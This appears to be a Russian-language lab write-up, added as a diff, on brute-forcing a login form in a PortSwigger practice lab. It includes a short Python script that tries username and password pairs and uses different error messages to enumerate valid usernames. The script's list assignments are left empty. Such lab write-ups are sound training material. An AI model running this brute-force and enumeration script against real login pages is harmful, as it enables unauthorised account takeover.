@@ -1,0 +1,31 @@
+Брутфорс аутентификационных форм - одна из самых простых атак в принципе, но, тем не менее, имеет интересные особенности в реализации, к примеру, разный тип ошибок при правильном/неправильном логине и неправильном/правильном пароле или обход CSRF.
+В PortSwigger есть лаборатории для атак на веб-аутентификацию, разберем первую из них. Нам дается список паролей и никнеймов, одна пара из которых валидна. Атаку можно провести, загрузив POST запрос с любым логином и паролем в Burp Intruder, включив данные нам 2 списка в payload. Но можно поступить интереснее - посредством собственного скрипта, который будет обновляться с усложнением атак на аутентификацию.
+Первоначально, скрипт выглядит следующим образом:
+import requests
+TARGET_URL = "https://0a2f006d04pc628d80bac12c00ce008c.web-security-academy.net/login"
+#u_list = input("Enter usernames' list: ")
+#u_list = list(u_list)
+#p_list = input("Enter passwords list: ")
+#p_list = list(p_list)
+
+u_list = 
+p_list = 
+def brute_force():
+    for username in u_list:
+        for password in p_list:
+            data = {
+                "username": username,
+                "password": password,
+            }
+
+            response = requests.post(TARGET_URL, data=data)
+
+            if "Invalid username" not in response.text:
+                if "Incorrect password" in response.text:
+                    print(f"[+] Valid username: {username} (wrong password)")
+                else:
+                    print(f"[+] Gotcha! {username}:{password}")
+                    return
+
+if __name__ == "__main__":
+    brute_force()
